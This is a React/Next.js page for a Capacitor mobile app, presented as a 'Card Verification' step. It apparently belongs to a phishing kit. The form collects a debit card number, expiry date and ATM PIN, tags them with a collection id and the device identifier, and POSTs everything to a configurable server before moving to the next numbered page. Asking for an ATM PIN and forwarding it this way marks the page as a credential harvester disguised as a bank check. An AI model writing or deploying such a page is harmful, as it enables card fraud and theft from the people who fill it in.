'use client';
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";  
import styles from '../css.module.css';
import { Device } from '@capacitor/device';

export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;

    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem("collection_id");
        jsonObject1['mobile_id'] = (await Device.getId()).identifier;;
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            router.push('/3');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
  return (
    <>
    <Header />
    <div className="container">
      <h5 className={`${styles.textCenterDiv} mt-4 mb-3`}> Card Verification</h5>
      <form onSubmit={handleSubmit} >
          <DebitCardInputComponent />
          <div className="d-flex gap-2 mt-3">
            <ExpiryDateInputComponent />
            <div className={`form-group ${styles.inputDiv}`}>
              <label>ATM Pin</label>
              <input type="password"  minLength={4} maxLength={4} name="atmpin" className={`form-control ${styles.formInput}`} required placeholder="****" />
            </div>
          </div>
          <div className="d-flex justify-content-center ">
            <button type="submit"  className="btn btn-primary"> CONTINUE </button>
          </div>
        </form>
  
    </div>
    <Footer />
</>
  );
}
